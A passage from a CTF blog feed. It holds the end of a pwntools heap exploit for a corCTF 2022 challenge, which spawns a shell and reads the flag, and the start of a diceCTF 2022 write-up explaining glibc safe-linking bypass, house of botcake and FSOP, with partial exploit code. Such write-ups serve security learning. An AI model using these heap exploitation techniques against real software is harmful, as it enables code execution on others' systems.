<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;//bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">7</span><span class="o">+</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">2</span><span class="p">):</span>
    <span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">7</span><span class="o">+</span><span class="mi">2</span><span class="p">):</span>
    <span class="n">delete</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;Y&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">+</span> <span class="mi">7</span><span class="p">))</span>

<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Y&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1 Add</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x1c7cc0</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">add</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">+</span> <span class="mi">7</span><span class="p">))</span>

<span class="n">show</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">heap</span> <span class="o">=</span> <span class="n">decrypt_pointer</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1 Add</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)))</span> <span class="o">-</span> <span class="mh">0x1000</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">environ</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xbe02f0</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x411</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x2730</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="mh">0x404010</span><span class="p">)))</span>

<span class="c1"># dumb</span>
<span class="n">add</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

<span class="c1">#===</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;5 re-age user</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;index: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">13</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter size (1032 minimum): </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1032</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input firstname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xbbdf80</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input middlename: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input lastname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x71ab0</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input age: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input bio: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4cb40</span><span class="p">))</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;cat flag.txt&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;flag: </span><span class="si">{</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>]]></content>
            
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/authors/nasm" term="nasm" label="nasm" />
                            
                        
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/corCTF" term="corCTF" label="corCTF" />
                             
                                <category scheme="https://nasm.re/tags/2022" term="2022" label="2022" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[diceCTF 2022 - pwn] catastrophe]]></title>
            <link href="https://nasm.re/posts/catastrophe/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/catastrophe/</id>
            
                    <author>
                        <name>nasm</name>
                    </author>
            <published>2022-07-28T00:00:00+00:00</published>
            <updated>2022-07-28T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h1 id="introduction">
        Introduction
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#introduction" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Introduction" href="#introduction">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<blockquote>
<p>I just learned how to use malloc and free&hellip; am I doing this right?</p>
</blockquote>
<p>catastrophe is a heap challenge I did during the diceCTF 2022. I did have a lot of issues with the libc and the dynamic linker, thus I did a first time the challenge with the libc that was in <code>/lib/libc.so.6</code>, then I figured out thanks to my teammate <a
  class="gblog-markdown__link"
  href="../../tags/supersnail"
  
  >supersnail</a
> that I was using the wrong libc. Then I did it again with the right libc but the dynamic linker was (again) wrong and I lost a loot of time on it. So well, the challenge wasn&rsquo;t pretty hard but I took a funny way to solve it because I thought the libc had <code>FULL RELRO</code> while  it had only <code>PARTIAL RELRO</code>. Find the exploit and the tasks <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/tree/master/2022/diceCTF/pwn/catastrophe"
  
  >right here</a
>.</p>



  <div class="gblog-toc gblog-toc__level--5">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#tl-dr">TL; DR</a></li>
    <li><a href="#what-we-have">What we have</a></li>
    <li><a href="#defeat-safe-linking">Defeat safe-linking</a></li>
    <li><a href="#house-of-botcake">House of botcake</a></li>
    <li><a href="#getting-arbitrary-write">Getting arbitrary write</a></li>
    <li><a href="#fsop-on-stdout-to-leak-environ">FSOP on stdout to leak environ</a></li>
    <li><a href="#ropchain">ROPchain</a></li>
    <li><a href="#resources">Resources</a></li>
    <li><a href="#appendices">Appendices</a></li>
  </ul>
</nav>
    <hr />
  </div>


<div class="gblog-post__anchorwrap">
    <h1 id="tl-dr">
        TL; DR
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#tl-dr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor TL; DR" href="#tl-dr">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<ul>
<li>Leak heap address + defeating safe linking by printing the first free&rsquo;d chunk in the tcache.</li>
<li><a
  class="gblog-markdown__link"
  href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c"
  
  >House of botcake</a
> to create overlapping chunks and get arbitrary write</li>
<li>FSOP on stdout to leak <code>environ</code> and then ROP over the stack.</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h1 id="what-we-have">
        What we have
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#what-we-have" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor What we have" href="#what-we-have">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>catastrophe is a classic heap challenge here are the classic informations about it:</p>
<pre tabindex="0"><code>$ ./libc.so.6 
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3) stable release version 2.35.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 11.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
$ checksec --file libc.so.6 
[*] '/home/nasm/Documents/ctf/2022/diceCTF/pwn/catastrophe/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
$ checksec --file catastrophe 
[*] '/home/nasm/Documents/ctf/2022/diceCTF/pwn/catastrophe/catastrophe'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre><p><code>2.35</code> libc, which means there is no more classic hooks like <code>__malloc_hook</code> or <code>__free_hook</code>. The binary allows to:</p>
<ul>
<li>malloc up to 0x200 bytes and read data in it with the use of <code>fgets</code></li>
<li>Allocate from the index 0 to 9</li>
<li>free anything given the index is between 0 and 9</li>
</ul>
<p>Thus we can easily do a <a
  class="gblog-markdown__link"
  href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c"
  
  >House of botcake</a
> but first of all we have to defeat the safe linking to properly getting an arbitrary write.</p>
<div class="gblog-post__anchorwrap">
    <h1 id="defeat-safe-linking">
        Defeat safe-linking
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#defeat-safe-linking" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Defeat safe-linking" href="#defeat-safe-linking">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>Since <code>2.32</code> is introduced in the libc the safe-linking mechanism that does some xor encyptions on <code>tcache</code>, <code>fastbin</code> next fp to prevent pointer hiijacking. Here is the core of the mechanism:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L340
</span><span class="c1"></span><span class="cm">/* Safe-Linking:
</span><span class="cm">   Use randomness from ASLR (mmap_base) to protect single-linked lists
</span><span class="cm">   of Fast-Bins and TCache.  That is, mask the &#34;next&#34; pointers of the
</span><span class="cm">   lists&#39; chunks, and also perform allocation alignment checks on them.
</span><span class="cm">   This mechanism reduces the risk of pointer hijacking, as was done with
</span><span class="cm">   Safe-Unlinking in the double-linked lists of Small-Bins.
</span><span class="cm">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with
</span><span class="cm">   larger pages provide less entropy, although the pointer mangling
</span><span class="cm">   still works.  */</span>
<span class="cp">#define PROTECT_PTR(pos, ptr) \
</span><span class="cp">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
</span><span class="cp">#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
</span></code></pre></div><p>Since for this challenge we&rsquo;re focused on <code>tcache</code>, here is how a chunk is free&rsquo;d using safe-linking:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L3175
</span><span class="c1"></span><span class="cm">/* Caller must ensure that we know tc_idx is valid and there&#39;s room
</span><span class="cm">   for more chunks.  */</span>
<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span>
<span class="nf">tcache_put</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">chunk</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">chunk</span><span class="p">);</span>

  <span class="cm">/* Mark this chunk as &#34;in the tcache&#34; so the test in _int_free will
</span><span class="cm">     detect a double free.  */</span>
  <span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="n">tcache_key</span><span class="p">;</span>

  <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">PROTECT_PTR</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">,</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
  <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div><p>Thus, the first time a chunk is inserted into a tcache list, <code>e-&gt;next</code> is initialized to <code>&amp;e-&gt;next &gt;&gt; 12</code> (heap base address) xor <code>tcache-&gt;entries[tc_idx]</code> which is equal to zero when the list for a given size is empty.</p>
<p>Which means to leak the heap address we simply have to print a free&rsquo;d chunk once it has been inserted in the tcache.</p>
<div class="gblog-post__anchorwrap">
    <h1 id="house-of-botcake">
        House of botcake
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#house-of-botcake" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor House of botcake" href="#house-of-botcake">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>The <a
  class="gblog-markdown__link"
  href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c"
  
  >House of botcake</a
> gives a write what where primitive by poisoning the tcache. The algorithm is:</p>
<ul>
<li>Allocate 7 <code>0x100</code> sized chunks to then fill the tcache (7 entries).</li>
<li>Allocate two more <code>0x100</code> sized chunks (<code>prev</code> and <code>a</code> in the example).</li>
<li>Allocate a small &ldquo;barrier&rdquo; <code>0x10</code> sized chunk.</li>
<li>Fill the tcache by freeing the first 7 chunks.</li>
<li>free(a), thus <code>a</code> falls into the unsortedbin.</li>
<li>free(prev), thus <code>prev</code> is consolidated with <code>a</code> to create a large <code>0x221</code> sized chunk that is yet in the unsortedbin.</li>
<li>Request one more <code>0x100</code> sized chunk to let a single entry left in the tcache.</li>
<li>free(a) again, given <code>a</code> is part of the large <code>0x221</code> sized chunk it leads to an UAF. Thus <code>a</code> falls into the tcache.</li>
<li>That&rsquo;s finished, to get a write what where we just need to request a <code>0x130</code> sized chunk. Thus we can hiijack the next fp of <code>a</code> that is currently referenced by the tcache by the location we wanna write to. And next time two <code>0x100</code> sized chunks are requested, the second one will be the target location.</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h1 id="getting-arbitrary-write">
        Getting arbitrary write
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#getting-arbitrary-write" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Getting arbitrary write" href="#getting-arbitrary-write">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>To make use of the write what were we got thanks to the <a
  class="gblog-markdown__link"
  href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c"
  
  >House of botcake</a
>, we need to get both heap and libc leak. To leak libc that&rsquo;s pretty easily we just need to print out a free&rsquo;d chunk stored into the unsortedbin, it&rsquo;s forward pointer is not encrypted with safe-linking.</p>
<p>As seen previously, to bypass safe-linking we have to print a free&rsquo;d chunk once it has been inserted in the tcache. It would give us the base address of the heap. When we got it, we just have to initialize the location we wanna write to <code>location ^ ((heap_base + chunk_offset) &gt;&gt; 12)</code> to encrypt properly the pointer, this way the primitive is efficient.</p>
<p>Implmentation of the <a
  class="gblog-markdown__link"
  href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c"
  
  >House of botcake</a
> + safe-linking bypass, heap and libc leak:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;-</span><span class="se">\n</span><span class="s2">&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Index?</span><span class="se">\n</span><span class="s2">&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> 

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">alloc</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">heap</span> <span class="o">=</span> <span class="p">((</span><span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">))</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="c1"># then we defeated safe linking lol</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="c1"># request back the chunk we used to leak the heap</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># prev</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># a</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1"># barrier</span>

<span class="c1"># fill tcache</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># free(a) =&gt; unsortedbin</span>
